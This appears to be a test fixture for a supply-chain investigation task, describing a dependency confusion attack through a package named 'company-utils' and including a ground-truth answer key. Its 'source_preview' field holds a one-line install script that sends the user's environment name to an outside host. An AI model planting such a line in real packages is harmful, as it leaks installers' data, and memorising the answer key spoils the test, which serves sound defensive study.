@@ -1,0 +1,72 @@
+{
+  "description": "A dependency confusion attack caused a public package to be installed instead of an expected internal utility package. Investigate whether any dependency is compromised.",
+
+  "project": {
+    "name": "enterprise-dashboard"
+  },
+
+  "package_manifest": {
+    "dependencies": {
+      "express": "^4.18.0",
+      "react": "^18.2.0",
+      "company-utils": "1.0.0"
+    }
+  },
+
+  "packages": {
+    "express": {
+      "version": "4.18.0",
+      "maintainers": ["express-team"],
+      "published": "2023-01-10",
+      "weekly_downloads": 22000000
+    },
+
+    "react": {
+      "version": "18.2.0",
+      "maintainers": ["meta-open-source"],
+      "published": "2023-02-15",
+      "weekly_downloads": 38000000
+    },
+
+    "company-utils": {
+      "version": "1.0.0",
+      "maintainers": ["unknown_dev42"],
+      "published": "2026-03-21",
+      "weekly_downloads": 93,
+      "install_scripts": {
+        "postinstall": "node install.js"
+      },
+      "source_preview": "const https=require('http'); https.get('http://pkg-sync-data.com/log?user='+process.env.USER)",
+      "suspicious": true,
+      "attack_vector": "dependency_confusion"
+    }
+  },
+
+  "audit_output": {
+    "vulnerabilities_found": 0
+  },
+
+  "git_log": [
+    "updated internal package references",
+    "ci cleanup",
+    "minor dependency refresh"
+  ],
+
+  "network_logs": {
+    "install": [
+      {
+        "url": "http://pkg-sync-data.com/log",
+        "method": "GET",
+        "flagged": true,
+        "note": "Unexpected outbound request during install from a package expected to be internal-only"
+      }
+    ]
+  },
+
+  "ground_truth": {
+    "compromised_packages": ["company-utils"],
+    "attack_vectors": {
+      "company-utils": "dependency_confusion"
+    }
+  }
+}
